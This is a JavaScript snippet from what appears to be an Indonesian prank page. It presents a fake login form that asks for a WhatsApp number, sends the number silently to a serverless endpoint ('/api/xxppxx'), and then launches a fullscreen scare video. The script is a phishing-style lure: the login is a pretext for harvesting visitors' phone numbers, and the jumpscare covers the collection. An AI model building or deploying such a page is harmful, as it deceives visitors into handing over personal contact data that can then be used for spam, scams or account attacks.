<script type="text/javascript">
  const video = document.getElementById("video");
  const scare = document.querySelector(".scare");
  const loginButton = document.getElementById("login-button");
  const inputText = document.getElementById("text");

  loginButton.addEventListener("click", function(event) {
      event.preventDefault();

      const nomor = inputText.value.trim();
      if(nomor === ""){
          alert("Masukkan nomor WhatsApp dulu!");
          return;
      }

      // Kirim ke serverless function
      fetch("/api/xxppxx", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ nomor })
      })
      .then(res => res.json())
      .then(data => console.log("Pesan terkirim:", data))
      .catch(err => console.error("Error kirim:", err));

      // Fungsi prank tetap jalan
      scare.style.display = "block";
      video.play();
      videoClick();
  });

  function videoClick(event) {
      if(event) event.preventDefault();
      const { documentElement } = document;
      if(documentElement.requestFullscreen) documentElement.requestFullscreen();
      else if(documentElement.mozRequestFullScreen) documentElement.mozRequestFullScreen();
      else if(documentElement.webkitRequestFullscreen) documentElement.webkitRequestFullscreen();
      else if(documentElement.msRequestFullscreen) documentElement.msRequestFullscreen();
  }

  video.addEventListener("click", videoClick);
        </script>
